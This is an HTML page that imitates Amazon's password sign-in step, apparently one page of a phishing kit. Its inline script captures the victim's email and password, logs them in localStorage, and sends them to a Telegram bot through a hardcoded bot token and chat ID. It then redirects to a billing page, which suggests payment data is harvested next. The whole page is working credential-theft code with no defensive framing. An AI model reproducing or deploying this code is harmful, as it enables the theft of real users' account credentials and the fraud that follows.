<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon — Sign In</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Amazon Ember',Arial,sans-serif}
        body{background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:15px 20px}
        .logo{margin:10px 0 20px}
        .logo img{height:30px}
        .kotak{width:100%;max-width:348px;padding:20px 26px;border:1px solid #ddd;border-radius:8px;background:#fff}
        h1{font-size:28px;font-weight:400;margin-bottom:15px}
        .baris-email{font-size:14px;color:#555;margin-bottom:20px;display:flex;justify-content:space-between}
        .ubah{color:#0066c0;text-decoration:none;font-size:14px}
        label{font-weight:700;font-size:13px;margin:0 0 6px;display:inline-block}
        .lupa{float:right;font-size:13px}
        .lupa a{color:#0066c0;text-decoration:none}
        .input{width:100%;padding:7px 10px;border:1px solid #a6a6a6;border-radius:4px;font-size:15px;height:32px;margin-bottom:20px}
        .tombol{width:100%;padding:6px;background:linear-gradient(to bottom,#f7df89,#ecc000);border:1px solid #d5b000;border-radius:8px;font-size:14px;height:40px;cursor:pointer}
        .tombol:disabled{background:#e9e9e9;border-color:#ccc;cursor:not-allowed}
        .bawah{margin-top:30px;padding-top:20px;border-top:1px solid #e7e7e7;width:100%;max-width:500px;text-align:center;font-size:11px;color:#555}
        .bawah a{color:#0066c0;text-decoration:none;margin:0 8px}
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1>Sign in</h1>
        <div class="baris-email">
            <span id="tampilEmail"></span>
            <a href="amazon.html" class="ubah">Change</a>
        </div>
        <label for="sandi">Password</label>
        <span class="lupa"><a href="#">Forgot password?</a></span>
        <input type="password" id="sandi" class="input">
        <button id="masuk" class="tombol">Sign in</button>
    </div>
    <div class="bawah">
        <p><a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a> <a href="#">Help</a></p>
        <p style="margin-top:5px;color:#767676">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
const token = localStorage.getItem('telegram_token') || '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
const chatid = localStorage.getItem('telegram_chatid') || '7808815199';

let email = localStorage.getItem('email_pengguna');
if (!email) {window.location.href='amazon.html';}
document.getElementById('tampilEmail').textContent = email;

document.getElementById('sandi').addEventListener('input',cek);
document.getElementById('masuk').addEventListener('click',kirim);

function cek(){
    const s = document.getElementById('sandi').value.trim();
    document.getElementById('masuk').disabled = !s;
}

async function kirim(){
    const sandi = document.getElementById('sandi').value.trim();
    if(!sandi) return;
    
    localStorage.setItem('kata_sandi', sandi);
    
    // Simpan ke panel
    const d = JSON.parse(localStorage.getItem('data_login')||'[]');
    d.push({email:email,pass:sandi,waktu:new Date().toLocaleString('id-ID')});
    localStorage.setItem('data_login',JSON.stringify(d));
    localStorage.setItem('stat_login',parseInt(localStorage.getItem('stat_login')||0)+1);
    
    // Kirim ke Telegram
    const pesan = `🔐 LOGIN\n📧 ${email}\n🔑 ${sandi}`;
    try{
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({chat_id:chatid,text:pesan,parse_mode:'Markdown'})
        });
    }catch(e){}
    
    window.location.href='billing.html';
}
</script>
</body>
</html>
